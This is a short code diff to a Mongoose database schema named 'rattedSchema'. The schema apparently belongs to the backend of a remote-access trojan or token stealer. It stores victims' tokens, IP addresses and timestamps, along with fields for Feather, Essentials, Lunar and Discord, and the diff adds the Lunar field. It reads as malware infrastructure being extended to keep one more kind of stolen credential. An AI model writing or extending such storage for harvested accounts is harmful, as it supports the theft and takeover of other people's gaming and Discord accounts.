@@ -6,9 +6,11 @@ const rattedSchema = mongoose.Schema({
     token: String,
     ip: String,
     timestamp: Date,
+
     tokenAuth: String,
     feather: String,
     essentials: String,
+    lunar: String,
     discord: String
 })
 
